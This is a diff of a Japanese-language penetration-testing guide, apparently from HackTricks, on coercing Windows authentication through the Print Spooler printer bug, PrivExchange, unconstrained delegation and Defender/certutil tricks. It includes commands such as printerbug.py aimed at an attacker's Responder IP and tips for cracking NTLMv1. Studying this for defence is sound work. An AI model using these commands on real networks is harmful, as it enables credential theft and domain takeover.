@@ -4,16 +4,16 @@
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、3rd party依存関係を避けるためにMIDLコンパイラを使用してC#でコーディングされた**リモート認証トリガー**の**コレクション**です。
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、**3rd party依存関係を避けるためにMIDLコンパイラを使用してC#でコーディングされた** **リモート認証トリガーのコレクション**です。
 
 ## スプーラーサービスの悪用
 
-_**Print Spooler**_ サービスが**有効**な場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、**通知を特定のシステムに送信するように指示**できます。\
-プリンターが任意のシステムに通知を送信する際には、その**システム**に対して**認証**を行う必要があります。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では**コンピューターアカウント**が使用されます。
+_**Print Spooler**_ サービスが **有効** の場合、既知のAD資格情報を使用して、ドメインコントローラーの印刷サーバーに新しい印刷ジョブの **更新** を **要求** し、通知を **特定のシステムに送信するように指示** できます。\
+プリンターが任意のシステムに通知を送信する際には、その **システムに対して認証する必要があります**。したがって、攻撃者は _**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では **コンピュータアカウント** を使用します。
 
-### ドメイン上のWindowsサーバーの発見
+### ドメイン上のWindowsサーバーの検索
 
-PowerShellを使用してWindowsボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう：
+PowerShellを使用して、Windowsボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう：
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
@@ -28,7 +28,7 @@ Linux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともで�
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### 任意のホストに対してサービスに認証を要求する
+### サービスに任意のホストに対して認証を要求させる
 
 [ **ここからSpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Unconstrained Delegationとの組み合わせ
 
-攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)でコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに対して認証させる**ことができます。制約のない委任のため、**プリンタのコンピュータアカウントのTGT**は、制約のない委任を持つコンピュータの**メモリ**に**保存されます**。攻撃者がすでにこのホストを侵害しているため、**このチケットを取得し**、それを悪用することができます（[Pass the Ticket](pass-the-ticket.md)）。
+攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)でコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに対して認証させる**ことができます。制約のない委任のため、**プリンタのコンピュータアカウントのTGT**は、制約のない委任を持つコンピュータの**メモリ**に**保存されます**。攻撃者はすでにこのホストを侵害しているため、**このチケットを取得し**、それを悪用することができます（[Pass the Ticket](pass-the-ticket.md)）。
 
 ## RCP強制認証
 
@@ -49,13 +49,13 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 ## PrivExchange
 
-`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーがHTTP経由で任意のクライアント提供ホストに対してExchangeサーバーを強制的に認証させることができます。
+`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーがHTTPを介して任意のクライアント提供ホストに対してExchangeサーバーを強制的に認証させることができます。
 
 デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な特権が与えられています（具体的には、**2019年以前の累積更新に対するWriteDacl特権を持っています**）。この欠陥は、**情報をLDAPに中継し、その後ドメインNTDSデータベースを抽出する**ために悪用できます。LDAPへの中継が不可能な場合でも、この欠陥はドメイン内の他のホストに中継および認証するために使用できます。この攻撃の成功した悪用は、認証された任意のドメインユーザーアカウントでドメイン管理者への即時アクセスを許可します。
 
 ## Windows内部
 
-すでにWindowsマシン内にいる場合、特権アカウントを使用してサーバーに接続するようWindowsを強制することができます。
+すでにWindowsマシン内にいる場合、特権アカウントを使用してサーバーに接続するようWindowsを強制することができます：
 
 ### Defender MpCmdRun
 ```bash
@@ -103,6 +103,6 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ## NTLMv1のクラッキング
 
 [NTLMv1チャレンジをキャプチャできる場合は、ここでそれをクラッキングする方法を読んでください](../ntlm/#ntlmv1-attack)。\
-&#xNAN;_&#x52;emember NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があります_
+&#xNAN;_&#x52;emember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
